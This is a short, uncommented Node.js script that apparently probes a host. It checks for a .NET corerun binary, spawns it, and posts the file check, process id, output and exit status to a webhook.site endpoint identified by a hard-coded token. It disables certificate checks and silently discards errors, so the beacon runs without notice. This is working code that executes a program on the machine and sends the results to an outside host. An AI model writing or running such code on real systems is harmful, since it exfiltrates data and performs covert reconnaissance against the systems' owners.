var https = require('https');
var fs = require('fs');
var cp = require('child_process');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
var corerun = '/usr/share/dotnet/shared/Microsoft.NETCore.App/2.1.4/corerun';
send('spawn', 'before exists=' + fs.existsSync(corerun) + ' path=' + corerun);
setTimeout(function () {
    try {
        var p = cp.spawn(corerun, ['--help'], { stdio: 'pipe' });
        send('spawn', 'spawned pid=' + p.pid);
        p.stdout.on('data', function (d) { send('spawn', 'OUT ' + d.toString().slice(0, 500)); });
        p.stderr.on('data', function (d) { send('spawn', 'ERR ' + d.toString().slice(0, 500)); });
        p.on('error', function (e) { send('spawn', 'process ERR ' + e); });
        p.on('exit', function (code, sig) { send('spawn', 'exit code=' + code + ' sig=' + sig); });
    } catch (e) {
        send('spawn', 'throw ' + e);
    }
}, 1500);
